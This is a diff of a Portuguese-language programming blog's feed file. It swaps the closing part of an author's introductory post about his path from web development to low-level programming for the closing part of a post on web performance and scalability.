-<p>Com o tempo, voltei para o desenvolvimento web e finalmente aprendi JavaScript. Assim, fui me aprofundando em frameworks e bibliotecas como React, Next.js e outros, tornando-me um desenvolvedor Full Stack. Depois de dominar o desenvolvimento web, retomei o estudo de programação de baixo nível.</p>
-
-<p>Li livros como <em>“Programação em Baixo Nível: C, Assembly e Execução de Programas na Arquitetura Intel 64”</em> de Igor Zhirkov e <em>“Código Limpo”</em>, muito conhecido na comunidade. Ao mesmo tempo, comecei a estudar processos de memória e, como teste, hackeava a memória de jogos antigos para entender como ela funcionava e como os desenvolvedores de jogos organizavam a memória.</p>
-
-<p>Atualmente, trabalho em um projeto open source de uma linguagem de programação em português chamada <a href="https://github.com/DesignLiquido/delegua">Delegua</a> e desenvolvo softwares para empresas da minha cidade. Eu amo programar e estou animado para compartilhar minha jornada e conhecimento neste blog!</p>]]></content><author><name></name></author><category term="Programação" /><category term="Inicio" /><category term="Web" /><category term="Baixo" /><category term="Nivel" /><summary type="html"><![CDATA[Olá! Meu nome é Italo Brito Brandão, mas sou mais conhecido na comunidade como ItaloCobains. Comecei a aprender a programar aos 16 anos, usando o Visualg. Sempre gostei de criar algoritmos e enfrentar desafios. Depois de um tempo, comecei a aprender sobre desenvolvimento web, estudando HTML e CSS, o que me proporcionou uma base sólida para aprender frameworks mais adiante.]]></summary></entry></feed>
+<p>Lembre-se de monitorar a performance da sua aplicação regularmente e ajustar as estratégias conforme necessário. Dessa forma, você garantirá que seus usuários desfrutem de uma experiência agradável e rápida, independentemente do tamanho e das demandas do seu projeto.</p>]]></content><author><name></name></author><category term="Desenvolvimento" /><category term="Web" /><category term="Performance" /><category term="Otimização" /><category term="Escalabilidade" /><summary type="html"><![CDATA[Olá! Neste post, vamos explorar técnicas criativas e avançadas para melhorar a performance de aplicações web, focando em soluções escaláveis que se adaptam a diferentes tamanhos de projetos e demandas. Vamos abordar estratégias para otimizar o carregamento de recursos, aperfeiçoar o tempo de resposta do servidor e proporcionar uma experiência de usuário mais ágil e agradável.]]></summary></entry></feed>
